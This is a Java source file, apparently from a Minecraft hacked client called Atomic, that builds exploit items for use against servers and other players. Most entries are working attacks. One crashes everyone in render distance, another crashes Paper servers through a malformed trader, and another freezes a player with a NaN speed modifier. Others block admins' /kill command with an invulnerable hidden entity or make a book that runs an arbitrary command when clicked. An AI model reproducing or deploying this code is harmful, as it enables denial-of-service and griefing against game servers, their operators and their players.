package me.zeroX150.atomic.feature;

import me.zeroX150.atomic.Atomic;
import me.zeroX150.atomic.feature.module.ModuleRegistry;
import me.zeroX150.atomic.feature.module.impl.exploit.HologramAura;
import me.zeroX150.atomic.helper.Client;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.enchantment.Enchantments;
import net.minecraft.entity.EquipmentSlot;
import net.minecraft.entity.attribute.EntityAttributeModifier;
import net.minecraft.entity.attribute.EntityAttributes;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.Vec3d;
import net.minecraft.util.registry.Registry;

import java.awt.*;
import java.util.UUID;

public class ItemExploits {
    public enum ItemExploit {
        HOLOGRAM_AURA("Hologram aura", new ExploitGenerator() {
            final Option name = new Option("Hologram content");
            final Option url = new Option("Image URL");

            @Override
            public ItemStack exploit() {
                String n = name.getAssociated().getText();
                String c = url.getAssociated().getText();
                HologramAura hga = (HologramAura) ModuleRegistry.getByClass(HologramAura.class);
                assert hga != null;
                if (hga.mode.getValue().equalsIgnoreCase("image") && c.isEmpty()) return null;
                HologramAura.argument = c;
                HologramAura.text = n;
                hga.setEnabled(true);
                return null;
            }

            @Override
            public Option[] getOptions() {
                return new Option[]{name, url};
            }

            @Override
            public String getDescription() {
                return "The funnies";
            }
        }),
        FIREBALL("Big fireball", new ExploitGenerator() {
            final Option v = new Option("Strength (INT)");

            @Override
            public ItemStack exploit() {
                int v1 = Client.tryParseInt(v.getAssociated().getText(), -1);
                if (v1 < 0) {
                    v.getAssociated().setEditableColor(new Color(255, 60, 60).getRGB());
                    return null;
                } else v.getAssociated().setEditableColor(0xFFFFFF);
                ItemStack stack = new ItemStack(Items.BEE_SPAWN_EGG);
                stack.setCustomName(Text.of("§r§c:)"));
                NbtCompound compound = stack.getOrCreateSubTag("EntityTag");
                compound.put("id", NbtString.of("minecraft:fireball"));
                compound.put("ExplosionPower", NbtDouble.of(v1));
                return stack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[]{v};
            }

            @Override
            public String getDescription() {
                return "Makes a big fireball";
            }
        }),
        BLOCKBAN("Blockban", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack stack = new ItemStack(Items.BEE_SPAWN_EGG);
                stack.setCustomName(Text.of("§r§chmm i wonder what this does"));
                NbtCompound compound = stack.getOrCreateSubTag("EntityTag");
                compound.put("id", NbtString.of("minecraft:area_effect_cloud"));
                compound.put("Particle", NbtString.of("minecraft:barrier"));
                compound.put("RadiusPerTick", NbtFloat.of(0f));
                compound.put("Duration", NbtInt.of(1310700));
                compound.put("WaitTime", NbtInt.of(60));
                return stack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "crashes everyone in render dist";
            }
        }),
        LAGMOR_STAND("Lagmor stand", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack itemStack = new ItemStack(Items.ARMOR_STAND);
                itemStack.setCustomName(Text.of("§r§cbig armor stand"));
                NbtCompound compoundTag = itemStack.getOrCreateSubTag("EntityTag");
                compoundTag.put("CustomName", NbtString.of("\"" + "0".repeat(32000) + "\""));
                compoundTag.put("CustomNameVisible", NbtByte.of(true));
                return itemStack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "big armor stand";
            }
        }),
        NO_MOVE_HELMET("Troll helmet", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack itemStack = new ItemStack(Items.LEATHER_HELMET);
                itemStack.addAttributeModifier(EntityAttributes.GENERIC_MOVEMENT_SPEED,
                        new EntityAttributeModifier(
                                UUID.nameUUIDFromBytes(
                                        new byte[]{(byte) 1772998660, (byte) 874858241, (byte) -1911483451, (byte) 795787135}),
                                "generic.movement_speed", Double.NaN,
                                EntityAttributeModifier.Operation.fromId(0)),
                        EquipmentSlot.HEAD);
                NbtCompound compoundTag = itemStack.getOrCreateTag();
                compoundTag.put("HideFlags", NbtInt.of(71));
                compoundTag.put("Unbreakable", NbtByte.of(true));
                itemStack.addEnchantment(Enchantments.PROTECTION, 1);
                itemStack.setCustomName(Text.of("§r§cTroll helmet. §4Generated by §lAtomic"));
                return itemStack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "makes you unable to move";
            }
        }),
        NO_ENTITY_KILL("/kill blocker", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack itemStack = new ItemStack(Items.BAT_SPAWN_EGG);
                itemStack.setCustomName(Text.of("§r§cNo Entity Kill. §4Generated by §lAtomic"));
                NbtCompound compoundTag = itemStack.getOrCreateTag();
                NbtCompound compoundTag1 = new NbtCompound();
                compoundTag1.put("LootTable", NbtString.of(""));
                compoundTag1.putString("id", "minecraft:chest_minecart");
                compoundTag1.putByte("Invulnerable", (byte) 1);
                compoundTag1.putByte("Invisible", (byte) 1);
                compoundTag1.putByte("NoGravity", (byte) 1);
                compoundTag.put("EntityTag", compoundTag1);
                return itemStack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "makes admins unable to run /kill @e";
            }
        }),
        BIG_FIREWORK("Big firework", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack is = new ItemStack(Items.FIREWORK_ROCKET);
                is.setCustomName(Text.of("§r§cBig firework. §4Generated by §lAtomic"));
                is.getOrCreateTag().put("HideFlags", NbtInt.of(32));
                NbtCompound fireworks = is.getOrCreateSubTag("Fireworks");
                fireworks.put("Flight", NbtInt.of(1));
                NbtList explosions = new NbtList();
                for (int i = 0; i < 100; i++) {
                    NbtIntArray colors = new NbtIntArray(new int[0]);
                    for (int ii = 0; ii < 20; ii++) colors.add(NbtInt.of((int) Math.floor(Math.random() * 0xFFFFFF)));
                    NbtCompound current = new NbtCompound();
                    current.put("Type", NbtInt.of((int) Math.floor(Math.random() * 4)));
                    current.put("Flicker", NbtInt.of(1));
                    current.put("Trail", NbtInt.of(1));
                    current.put("Colors", colors);
                    explosions.add(current);
                }
                fireworks.put("Explosions", explosions);
                return is;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "big firework";
            }
        }),
        EXECUTOR_BOOK("Execution book", new ExploitGenerator() {
            final Option title = new Option("Title");
            final Option author = new Option("Author");
            final Option text = new Option("Text");
            final Option command = new Option("Command");

            @Override
            public ItemStack exploit() {
                String title = this.title.getAssociated().getText().isEmpty() ? "Open me" : this.title.getAssociated().getText();
                String author = this.author.getAssociated().getText().isEmpty() ? Atomic.client.player.getGameProfile().getName() : this.author.getAssociated().getText();
                String text = this.text.getAssociated().getText();
                String command = this.command.getAssociated().getText();
                if (command.isEmpty()) {
                    this.command.getAssociated().setEditableColor(0xFF3333);
                    return null;
                } else this.command.getAssociated().setEditableColor(0xFFFFFF);
                ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
                NbtCompound tag = book.getOrCreateTag();
                tag.put("title", NbtString.of(title));
                tag.put("author", NbtString.of(author));
                NbtList pages = new NbtList();
                pages.add(NbtString.of("{\"text\":\"" + (text + " ".repeat(500)) + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command + "\"}}"));
                pages.add(NbtString.of("{\"text\":\"\"}"));
                tag.put("pages", pages);
                book.setTag(tag);
                return book;
            }

            @Override
            public Option[] getOptions() {
                return new Option[]{title, author, text, command};
            }

            @Override
            public String getDescription() {
                return "makes a book that runs a command";
            }
        }),
        INF_SPAWNEGG("Infinite spawn egg", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                Vec3d ppos = Atomic.client.player.getPos();
                ItemStack is = new ItemStack(Items.COW_SPAWN_EGG);
                NbtCompound c = new NbtCompound();
                NbtList l = new NbtList();
                l.add(NbtDouble.of(ppos.x));
                l.add(NbtDouble.of(Double.POSITIVE_INFINITY));
                l.add(NbtDouble.of(ppos.z));
                c.put("Pos", l);
                is.putSubTag("EntityTag", c);
                return is;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "just makes an entity spawn at y=Inf";
            }
        }),
        CUSTOM_META("Custom meta", new ExploitGenerator() {
            final Option itemName = new Option("Item ID");
            final Option nbt = new Option("Custom NBT");

            @Override
            public ItemStack exploit() {
                Item i = Registry.ITEM.get(new Identifier(itemName.getAssociated().getText()));
                if (i == Items.AIR) {
                    itemName.getAssociated().setEditableColor(0xFF3C3C);
                    return null;
                } else itemName.getAssociated().setEditableColor(0xFFFFFF);
                ItemStack stack = new ItemStack(i);
                String v = nbt.getAssociated().getText().isEmpty() ? "{}" : nbt.getAssociated().getText();
                try {
                    NbtCompound comp = StringNbtReader.parse(v);
                    nbt.getAssociated().setEditableColor(0xFFFFFF);
                    stack.setTag(comp);
                } catch (Exception ignored) {
                    nbt.getAssociated().setEditableColor(0xFF3C3C);
                    return null;
                }
                return stack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[]{itemName, nbt};
            }

            @Override
            public String getDescription() {
                return "Makes an item with custom meta";
            }
        }),
        SERVER_CRASH_TRADER("Server crash trader", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack spawn = new ItemStack(Items.WANDERING_TRADER_SPAWN_EGG);
                try {
                    NbtCompound nc = StringNbtReader.parse("{Offers:{Recipes:[{buyB:{id:\"minecraft:dirt\",Count:1b},sell:{id:\"minecraft:stick\",Count:1b}}]},NoAI:1b}");
                    spawn.putSubTag("EntityTag", nc);
                } catch (Exception ignored) {
                    return null;
                }
                Client.notifyUser("Trade with the trader to crash the server (Paper only :sadge:)");
                return spawn;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "Spawns a funny man";
            }
        });


        String name;
        ExploitGenerator generator;

        ItemExploit(String name, ExploitGenerator generator) {
            this.name = name;
            this.generator = generator;
        }

        public ExploitGenerator getGenerator() {
            return generator;
        }

        public String getName() {
            return name;
        }
    }

    public interface ExploitGenerator {
        ItemStack exploit();

        Option[] getOptions();

        default String getDescription() {
            return "No description";
        }

    }

    public static class Option {
        String name;
        TextFieldWidget associated;

        public Option(String name) {
            this.name = name;
        }

        public String getName() {
            return name;
        }

        public TextFieldWidget getAssociated() {
            return associated;
        }

        public void setAssociated(TextFieldWidget w) {
            associated = w;
        }
    }
}
